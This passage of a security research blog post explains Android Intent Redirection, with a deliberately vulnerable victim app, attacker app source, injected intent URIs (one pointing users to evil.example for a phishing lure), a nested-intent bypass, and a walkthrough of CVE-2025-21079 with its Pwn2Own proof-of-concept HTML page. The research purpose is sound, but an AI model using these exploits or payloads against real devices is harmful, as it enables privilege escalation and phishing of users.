+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String TAG = <span class="hljs-string">&quot;victim&quot;</span>;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>{
+        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);
+
+        String uri = getIntent().getStringExtra(<span class="hljs-string">&quot;redirect_uri&quot;</span>);
+        Log.i(TAG, <span class="hljs-string">&quot;redirect_uri = &quot;</span> + uri);
+
+        <span class="hljs-keyword">if</span> (uri != <span class="hljs-keyword">null</span>) {
+            <span class="hljs-keyword">try</span> {
+                Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
+                startActivity(forward);   <span class="hljs-comment">// vuln</span>
+            } <span class="hljs-keyword">catch</span> (URISyntaxException e) {
+                Log.e(TAG, <span class="hljs-string">&quot;bad redirect_uri&quot;</span>, e);
+                Toast.makeText(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;Invalid payload: &quot;</span> + e.getMessage(), Toast.LENGTH_LONG).show();
+            } <span class="hljs-keyword">catch</span> (Exception e) {
+                Log.e(TAG, <span class="hljs-string">&quot;startActivity failed&quot;</span>, e);
+                Toast.makeText(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;Launch failed: &quot;</span> + e.getMessage(), Toast.LENGTH_LONG).show();
+            }
+        }
+        finish();
+    }
+}</code></pre>
+<p>This source code is the part where the vulnerability exists. Because there is a statement that fires the intent without validation via <code>startActivity(forward);</code>, Intent Redirection occurs.</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.victim;
+
+<span class="hljs-keyword">import</span> android.app.Activity;
+<span class="hljs-keyword">import</span> android.os.Bundle;
+<span class="hljs-keyword">import</span> android.widget.TextView;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SecretActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Activity</span> </span>{
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String NOTICE =
+            <span class="hljs-string">&quot;[Notice] System maintenance is scheduled today at 18:00.&quot;</span>;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>{
+        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);
+
+        String extra = getIntent().getStringExtra(<span class="hljs-string">&quot;append&quot;</span>);
+
+        String shown = NOTICE;
+        <span class="hljs-keyword">if</span> (extra != <span class="hljs-keyword">null</span>) {
+            shown = NOTICE + <span class="hljs-string">&quot;\n&quot;</span> + extra;
+        }
+
+        TextView tv = <span class="hljs-keyword">new</span> TextView(<span class="hljs-keyword">this</span>);
+        <span class="hljs-keyword">int</span> pad = (<span class="hljs-keyword">int</span>) (<span class="hljs-number">16</span> * getResources().getDisplayMetrics().density);
+        tv.setPadding(pad, pad, pad, pad);
+        tv.setTextIsSelectable(<span class="hljs-keyword">true</span>);
+        tv.setText(<span class="hljs-string">&quot;SecretActivity (exported=false)\n\n&quot;</span> + shown);
+        setContentView(tv);
+    }
+}</code></pre>
+<p>This part is the restricted internal activity we saw earlier in <code>AndroidManifest.xml</code>. As originally intended, it prints only a hardcoded string on the screen. However, it receives an intent with the app&#x2019;s permissions, and because this too has no caller validation, when Intent Redirection occurs the input value is additionally printed as well.</p>
+<p>The following is the source code of <code>attacker.apk</code>.</p>
+<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.attacker;
+
+<span class="hljs-keyword">import</span> android.app.Activity;
+<span class="hljs-keyword">import</span> android.content.Intent;
+<span class="hljs-keyword">import</span> android.os.Bundle;
+<span class="hljs-keyword">import</span> android.view.View;
+<span class="hljs-keyword">import</span> android.widget.Button;
+<span class="hljs-keyword">import</span> android.widget.EditText;
+<span class="hljs-keyword">import</span> android.widget.Toast;
+
+<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Activity</span> </span>{
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String VICTIM_PKG = <span class="hljs-string">&quot;com.example.victim&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String REDIRECT_ACTIVITY = <span class="hljs-string">&quot;com.example.victim.RedirectActivity&quot;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SECRET_ACTIVITY = <span class="hljs-string">&quot;com.example.victim.SecretActivity&quot;</span>;
+
+    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> String SAMPLE_PAYLOAD =
+            <span class="hljs-string">&quot;intent:#Intent;component=com.example.victim/.SecretActivity;&quot;</span>
+            + <span class="hljs-string">&quot;S.append=* Re-authenticate at http://evil.example for security;end&quot;</span>;
+
+    <span class="hljs-meta">@Override</span>
+    <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> </span>{
+        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        <span class="hljs-keyword">final</span> EditText payload = findViewById(R.id.payload);
+        payload.setText(SAMPLE_PAYLOAD);
+
+        Button send = findViewById(R.id.btn_send);
+        send.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() {
+            <span class="hljs-meta">@Override</span>
+            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>{
+                String text = payload.getText().toString();
+                Intent i = <span class="hljs-keyword">new</span> Intent(<span class="hljs-string">&quot;com.example.victim.REDIRECT&quot;</span>);
+                i.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
+                i.putExtra(<span class="hljs-string">&quot;redirect_uri&quot;</span>, text);
+                <span class="hljs-keyword">try</span> {
+                    startActivity(i);
+                } <span class="hljs-keyword">catch</span> (Exception e) {
+                    Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,
+                            <span class="hljs-string">&quot;Send failed: &quot;</span> + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+
+        Button direct = findViewById(R.id.btn_direct);
+        direct.setOnClickListener(<span class="hljs-keyword">new</span> View.OnClickListener() {
+            <span class="hljs-meta">@Override</span>
+            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onClick</span><span class="hljs-params">(View v)</span> </span>{
+                <span class="hljs-keyword">try</span> {
+                    Intent i = <span class="hljs-keyword">new</span> Intent();
+                    i.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
+                    startActivity(i);
+                    Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,
+                            <span class="hljs-string">&quot;Launched directly (unexpected)&quot;</span>, Toast.LENGTH_LONG).show();
+                } <span class="hljs-keyword">catch</span> (SecurityException e) {
+                    Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,
+                            <span class="hljs-string">&quot;Direct launch denied: &quot;</span> + e.getMessage(), Toast.LENGTH_LONG).show();
+                } <span class="hljs-keyword">catch</span> (Exception e) {
+                    Toast.makeText(MainActivity.<span class="hljs-keyword">this</span>,
+                            <span class="hljs-string">&quot;Direct launch failed: &quot;</span> + e.getMessage(), Toast.LENGTH_LONG).show();
+                }
+            }
+        });
+    }
+}</code></pre>
+<p>This source code is the part that sends the input value. To trigger Intent Redirection, it was written to target the hidden <code>SECRET_ACTIVITY</code> in <code>victim.apk</code>. In addition, a button was also made to check what happens when an intent is sent with <code>attacker.apk</code>&#x2018;s permissions.</p>
+<p><img src="Screen_recording_20261123_173334.gif" srcset="/img/loading.gif" alt="Screen recording"></p>
+<p>This is the result of the hands-on using <code>attacker.apk</code> and <code>victim.apk</code>. In <code>victim.apk</code>, a hardcoded string is printed by default. And because it is <code>exported=&quot;false&quot;</code>, you can see that <code>attacker.apk</code> cannot access that activity directly.</p>
+<pre><code class="hljs fortran"><span class="hljs-keyword">intent</span>:#<span class="hljs-keyword">Intent</span>;component=com<span class="hljs-number">.</span>example<span class="hljs-number">.</span>victim/<span class="hljs-number">.</span>SecretActivity;S<span class="hljs-number">.</span>append=INJECTED;<span class="hljs-keyword">end</span></code></pre>
+<p>However, if you send an Intent message containing the message above, Intent Redirection occurs and this can be bypassed. The entity that calls <code>startActivity(forward)</code>, the vulnerability identified earlier, is the victim process (victim UID). So the permission check of system_server, which performs basic UID validation, sees caller UID == target UID and allows the launch of the non-exported activity <code>SecretActivity</code>.</p>
+<p>Through this, the malicious string entered by the attacker was inserted, and we can confirm that a phishing scenario that lures the user into accessing a malicious URL is possible.</p>
+<h2 id="3-Nested-Intent"><a href="#3-Nested-Intent" class="headerlink" title="3. Nested Intent"></a>3. Nested Intent</h2><p><img src="image%205.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>As the name implies, a Nested Intent means an Intent object in which multiple Intents exist in a nested state. It is a method of putting a completed Intent object into another Intent&#x2019;s extra as a Parcelable and sending it, and making the victim app take it out and execute it as is.</p>
+<p>Apps often put an Intent inside an Intent to pass along the next screen to open after a screen transition. Returning to the original screen after login, resuming work after a permission request, and routing proxy Activities are representative examples. Since <code>Intent</code> is <code>Parcelable</code>, it can be placed directly via <code>putExtra(&quot;next&quot;, innerIntent)</code>.</p>
+<p>This too, as a hands-on, let&#x2019;s check what happens if we change the earlier hands-on into a nested intent.</p>
+<pre><code class="hljs java">Intent forward = Intent.parseUri(uri, Intent.URI_INTENT_SCHEME);
+<span class="hljs-keyword">if</span> (Guard.isAllowed(<span class="hljs-keyword">this</span>, forward)) {     <span class="hljs-comment">// patch</span>
+    Log.i(TAG, <span class="hljs-string">&quot;[parseUri] allowed -&gt; &quot;</span> + Guard.describe(forward));
+    launch(forward, <span class="hljs-string">&quot;parseUri&quot;</span>);</code></pre>
+<p>As a patch for the earlier Intent Redirection, <code>victim.apk</code> changes, as above, to take out and execute the Intent object from the extra instead of a string.</p>
+<pre><code class="hljs java">Intent inner = <span class="hljs-keyword">new</span> Intent();
+inner.setClassName(VICTIM_PKG, SECRET_ACTIVITY);
+inner.putExtra(<span class="hljs-string">&quot;append&quot;</span>, INJECTED);
+
+Intent outer = <span class="hljs-keyword">new</span> Intent(ACTION_REDIRECT);
+outer.setClassName(VICTIM_PKG, REDIRECT_ACTIVITY);
+outer.putExtra(<span class="hljs-string">&quot;forward_intent&quot;</span>, inner);
+send(outer);</code></pre>
+<p>To bypass this, <code>attacker.apk</code> writes the payload into the inner Intent in nested intent form. And it composes a normal intent in the outer Intent extra, nesting the intents.</p>
+<p><img src="Screen_recording_20261123_215017.gif" srcset="/img/loading.gif" alt="Screen recording"></p>
+<p>When you run the hands-on, you can confirm that Intent Redirection is blocked by the patch. However, when you send a payload made as a nested intent, you can confirm that the exploit works well. Like this, a nested intent can bypass two main things.</p>
+<p>The first is the app&#x2019;s input validation. Looking only at the outer Intent it appears normal, but the attack payload is wrapped as a Parcel inside the extra, so it passes the scheme/host/action whitelist check on the basis of the outer Intent. Until the victim app takes it out with <code>getParcelableExtra()</code>, the inner Intent is just an opaque lump of parcel bytes.</p>
+<p>The second is the <code>android:exported=&quot;false&quot;</code> access restriction. If you set the inner Intent&#x2019;s component to the victim app&#x2019;s private Activity, the victim app calls <code>startActivity()</code> with its own UID, so the permission check passes.</p>
+<p>Android 16 blocks this pattern at the OS level. When both the app&#x2019;s targetSdk and the OS are Android 16, an Intent taken out of an extra is blocked from execution by default. However, if the developer calls <code>removeLaunchSecurityProtection()</code> on the taken-out Intent, this protection is lifted.</p>
+<h2 id="4-1-Day-Case-CVE-2025-21079"><a href="#4-1-Day-Case-CVE-2025-21079" class="headerlink" title="4. 1-Day Case: CVE-2025-21079"></a>4. 1-Day Case: CVE-2025-21079</h2><p>Let&#x2019;s look at <a target="_blank" rel="external nofollow noopener noreferrer" href="https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/">CVE-2025-21079</a>, a real-world case of Intent Redirection. This vulnerability was demonstrated at Pwn2Own Ireland 2025. It is a vulnerability that chains from the Samsung Members app and ultimately allows launching an Activity with System privileges. It is a chain that displays an attacker-controlled URL in the WebView inside the Samsung Members app and, through that WebView, connects all the way to Intent Redirection.</p>
+<h3 id="4-1-Webview"><a href="#4-1-Webview" class="headerlink" title="4.1. Webview"></a>4.1. Webview</h3><pre><code class="hljs java">String url = getIntent().getStringExtra(<span class="hljs-string">&quot;url&quot;</span>);
+String viewType = getIntent().getStringExtra(<span class="hljs-string">&quot;viewType&quot;</span>);
+<span class="hljs-keyword">boolean</span> allowWithoutLogin =
+        getIntent().getBooleanExtra(<span class="hljs-string">&quot;ALLOW_WITHOUT_LOGIN&quot;</span>, <span class="hljs-keyword">false</span>);
+
+<span class="hljs-keyword">if</span> (ActionUri.canPerformActionLink(getIntent())
+        &amp;&amp; (allowWithoutLogin || isLoggedIn())) { <span class="hljs-comment">// vuln</span>
+    route(ActionUri.NEWS_AND_TIPS_DETAIL, getIntent().getExtras());
+}</code></pre>
+<p>If <code>allowWithoutLogin</code> is <code>true</code>, it routes immediately without checking <code>isLoggedIn()</code>, so if the attacker simply puts <code>ALLOW_WITHOUT_LOGIN=true</code> in the extra, they can enter the internal screen without logging in.</p>
+<pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;INAPP&quot;</span>.equals(viewType) &amp;&amp; url != <span class="hljs-keyword">null</span> &amp;&amp; url.startsWith(<span class="hljs-string">&quot;http&quot;</span>)) {
+    webView.getSettings().setJavaScriptEnabled(<span class="hljs-keyword">true</span>);
+    webView.setWebViewClient(<span class="hljs-keyword">new</span> yi3());
+    webView.loadUrl(url); <span class="hljs-comment">// vuln</span>
+}</code></pre>
+<p>It only checks whether <code>viewType</code> is <code>&quot;INAPP&quot;</code> and <code>url</code> starts with <code>http</code>, then calls <code>loadUrl(url)</code>. Since it does not validate the target host or domain at all, if the attacker puts their own server address in the extra <code>url</code>, that page is loaded as-is into Samsung Members&#x2019; WebView.</p>
+<h3 id="4-2-Intent-Redirection"><a href="#4-2-Intent-Redirection" class="headerlink" title="4.2. Intent Redirection"></a>4.2. Intent Redirection</h3><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">shouldOverrideUrlLoading</span><span class="hljs-params">(WebView view, WebResourceRequest req)</span> </span>{
+    String url = req.getUrl().toString();
+    oh6.L(activity, url);
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
+}</code></pre>
+<p><code>yi3.shouldOverrideUrlLoading</code> intercepts every URL the WebView tries to navigate to, turns it into a string, and passes it to <code>oh6.L</code>. If the attacker&#x2019;s server returns an <code>intent:</code> URL as a 302 response to the page loaded in step 1, that URL reaches <code>oh6.L</code> as-is.</p>
+<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">L</span><span class="hljs-params">(Activity activity, String str)</span> </span>{
+    <span class="hljs-keyword">if</span> (TextUtils.isEmpty(str)) <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">if</span> (!str.startsWith(<span class="hljs-string">&quot;intent:&quot;</span>)) <span class="hljs-keyword">return</span>;
+    <span class="hljs-keyword">try</span> {
+        Intent uri = Intent.parseUri(str, <span class="hljs-number">1</span>);
+        activity.getPackageManager().getPackageInfo(uri.getPackage(), <span class="hljs-number">0</span>);
+        activity.startActivity(uri); <span class="hljs-comment">// vuln</span>
+    } <span class="hljs-keyword">catch</span> (Exception e) {
+    }
+}</code></pre>
+<p>The component, action, and extra of the delivered Intent are all values the attacker wrote into the <code>intent:</code> URL, and <code>oh6.L</code> does not check at all whether the source or target is safe. Since the entity calling <code>startActivity</code> is Samsung Members, this Intent is fired with Samsung Members&#x2019; permissions and launches any installed exported component with one click.</p>
+<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;height:200px;width:200px&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;yaystartyay()&quot;</span>&gt;</span>yaypocyay<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span>
+
+<span class="javascript">        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">yaystartyay</span>(<span class="hljs-params"></span>) </span>{</span>
+<span class="javascript">            <span class="hljs-keyword">var</span> yayhostyay = <span class="hljs-string">&quot;172.16.30.113&quot;</span></span>
+
+<span class="javascript">            <span class="hljs-comment">// open com.samsung.android.voc</span></span>
+<span class="javascript">            location.href=<span class="hljs-string">&quot;intent://view/newsAndTipsDetail#Intent;S.viewType=INAPP;scheme=voc;B.ALLOW_WITHOUT_LOGIN=true;S.url=http%3A%2F%2F&quot;</span> + yayhostyay + <span class="hljs-string">&quot;%3A8000%2Fyayredirect1yay;end&quot;</span>;</span>
+        }
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></code></pre>
+<p>The code above is the HTML code on the malicious web page that contains the Intent Redirection payload. In other words, it bypasses the <code>intent: URL</code> check in the WebView, and the app interprets it with <code>parseUri</code> and executes it as-is. Through this, any exported Activity of an installed package can be launched with a single click.</p>
+<p><img src="image%206.png" srcset="/img/loading.gif" alt="[Pwn2Own 2025 &#x2013; Part 1: Samsung Members WebView Takeover &amp; Intent Redirection (CVE-2025-21079) | Djini AI](https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/)"></p>
+<p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://djini.ai/posts/pwn2own-2025-samsung-members-webview-takeover-and-intent-redirection/">Pwn2Own 2025 &#x2013; Part 1: Samsung Members WebView Takeover &amp; Intent Redirection (CVE-2025-21079) | Djini AI</a></p>
+<p>Looking at the GIF of the PoC process, triggering the PoC link from the malicious URL with one click goes through the Samsung Members app and ultimately launches the Settings app. Since the Settings app is a System-privileged app holding UID 1000, this PoC confirms that a 1-Click System Activity Launch is possible. The article explains that the Pwn2Own chain was then completed with a chain continuing into Samsung Account and Bixby.</p>
+<p><img src="image%207.png" srcset="/img/loading.gif" alt="image.png"></p>
+<p>As revealed in Android&#x2019;s development philosophy examined earlier, Android has the characteristic of isolation between apps. Because of this, the representative means of affecting another app is exactly the Intent, and in terms of impact such as Lateral Movement as well as from a vulnerability and exploitation perspective, Intent Redirection is very important in Android.</p>
+<p>And through this vulnerability, via an app without permissions or via input, one can obtain or access high privileges such as system (UID 1000). That is why it frequently appears and is used at Pwn2Own as well.</p>
+<p>In my personal opinion, now that countless vulnerabilities are being found and patched with LLMs, I think this is a vulnerability that is relatively hard for AI to find. Compared to Memory Corruption, where the vulnerability is immediately revealed in the code through static analysis, I think the strength of Intent Redirection&#x2014;which arises in communication between other apps that looks as if it were normal&#x2014;is becoming apparent.</p>
+<p>So! I&#x2019;ll work hard to find vulnerabilities and try to write the next article with a vulnerability I found myself!</p>
+<p>Next time, I&#x2019;ll be back as Part 3 with another teammate. Thank you!</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                <div class="post-meta mr-3">
+                  <i class="iconfont icon-category"></i>
+                  
+                  <a class="hover-with-bg" href="/categories/Research/">Research</a>
+                  
+                </div>
+                
+                
+                <div class="post-meta">
+                  <i class="iconfont icon-tags"></i>
+                  
+                  <a class="hover-with-bg" href="/tags/Android/">Android</a>
+                  
+                  <a class="hover-with-bg" href="/tags/newp1ayer48/">newp1ayer48</a>
+                  
+                </div>
+                
+              </div>
+
+              <div class="post-metas mb-3">
+                <a class="hover-with-bg" style="display: flex;" href="/author">
+                  <div class="link-avatar-page">
+                    <img src="/img/profile_newp1ayer48.jpg" srcset="/img/loading.gif" alt="newp1ayer48">
+                  </div>
+
+                  <div class="link-text">
+                    <div class="link-title">newp1ayer48</div>
+                  </div>
+                </a>
+                <div class="link-text">
+                  <div class="link-more">
+                    <a href="/tags/newp1ayer48">
+                      Read more
+                      <i class="iconfont icon-arrowdown"></i>
+                    </a>
+                  </div>
+                </div>
+              </div>
+
+              <hr>
+              <!--<script data-ad-client="ca-pub-3672652207808168" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>-->
+              
+              <!--  -->
+              <p class="note note-warning">본 글은 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.ko" rel="external nofollow noopener noreferrer">CC BY-SA 4.0</a> 라이선스로 배포됩니다. 공유 또는 변경 시 반드시 출처를 남겨주시기 바랍니다.</p>
+              
+              
+              
+              <div class="post-prevnext row">
+                <article class="post-prev col-6">
+                  
+                  
+                </article>
+                <article class="post-next col-6">
+                  
+                  
+                  <a href="/2026/11/26/newp1ayer48/android1/ko/">
+                    <span class="hidden-mobile">[이상동몽] 루팅을 못한 자의 무기: Intent Redirection Part 1. (KR)</span>
+                    <span class="visible-mobile">Next</span>
+                    <i class="iconfont icon-arrowright"></i>
+                  </a>
+                  
+                </article>
+              </div>
+              
+            </div>
+            
+            
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+    <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+      <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+    </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="external nofollow noopener noreferrer"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="external nofollow noopener noreferrer">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="/js/debouncer.js"></script>
+<script src="/js/main.js"></script>
+
+<!-- Plugins -->
+
+
+  
+    <script src="/js/lazyload.js"></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+  <script src="/js/clipboard-use.js"></script>
+
+
+
+
+
+
+
+  <script src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '#post-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "[Two paths, Same Dream] A Weapon for Those Without Rooting: Intent Redirection Part 1. (EN)&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'UA-177243668-2', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src="https://www.google-analytics.com/analytics.js"></script>
+  
+
+  
+    <!-- Google gtag.js -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-177243668-2"></script>
+    <script defer>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-177243668-2');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+</body>
+</html>
